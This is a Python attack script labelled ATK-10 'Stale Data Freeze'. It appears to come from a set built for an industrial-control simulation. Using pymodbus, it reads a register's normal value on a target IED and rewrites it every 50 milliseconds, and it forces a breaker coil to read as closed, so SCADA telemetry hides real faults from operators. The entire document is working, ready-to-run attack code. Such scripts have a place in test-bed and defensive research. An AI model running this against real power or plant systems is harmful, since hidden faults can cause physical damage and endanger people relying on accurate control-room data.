#!/usr/bin/env python3
"""
ATK-10 | Stale Data Freeze
===========================
This attack captures the "normal" state of the simulation right now, and then 
loops infinitely, actively writing that normal state over and over again. If 
the physics engine detects a fault and tries to update the register with a 
dangerous value, this script instantly overwrites it back to the "clean" value, 
freezing the telemetry screens in the control room.

Usage
-----
    python atk10_stale_data_freeze.py
    python atk10_stale_data_freeze.py --target 127.0.0.1 --port 5020 --register 1024
"""
import argparse
import time
from pymodbus.client import ModbusTcpClient

def main():
    parser = argparse.ArgumentParser(
        description="ATK-10: Freeze telemetry by repeatedly writing a captured sane state."
    )
    parser.add_argument("--target", type=str, default="127.0.0.1", help="Target IED IP address")
    parser.add_argument("--port", type=int, default=5020, help="Target IED Modbus TCP port")
    parser.add_argument("--register", type=int, default=1024, help="Register address to freeze (default 1024 = %MW0)")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("  ATK-10  |  Stale Data Freeze")
    print("=" * 60)
    print(f"[*] Target IED        : {args.target}:{args.port}")
    print(f"[*] Target Register   : {args.register}")
    print()

    client = ModbusTcpClient(args.target, port=args.port)
    if not client.connect():
        print("[-] FAILED: Could not connect to the Modbus server. Is the stack running?")
        return
        
    # 1. Read the current "normal" measurement
    read_resp = client.read_holding_registers(args.register, count=1)
    if read_resp.isError():
        print("[-] FAILED: Could not capture initial state from register.")
        client.close()
        return
        
    frozen_value = read_resp.registers[0]
    print(f"[*] Captured normal state: {frozen_value}")
    print("[*] Freezing telemetry ... SCADA will not see any future faults!")
    
    # 2. Infinitely write the captured state back faster than the PLC updates
    try:
        iteration = 0
        while True:
            # Freeze the voltage measurement
            client.write_register(args.register, frozen_value)
            # Freeze the breaker state (Coil 0 = %QX0.0) to appear CLOSED (False)
            client.write_coil(0, False)
            
            iteration += 1
            if iteration % 20 == 0:
                print(f"[~] Maintained frozen state {frozen_value} & Breaker=CLOSED for {iteration} cycles...", end="\r")
            time.sleep(0.05) # 50ms writes, much faster than a standard SCADA polling loop
            
    except KeyboardInterrupt:
        print("\n\n[!] Attack halted by user.")
    except Exception as e:
        print(f"\n\n[-] Exception: {e}")
    finally:
        client.close()
        print("[*] Modbus connection closed.")


if __name__ == "__main__":
    main()
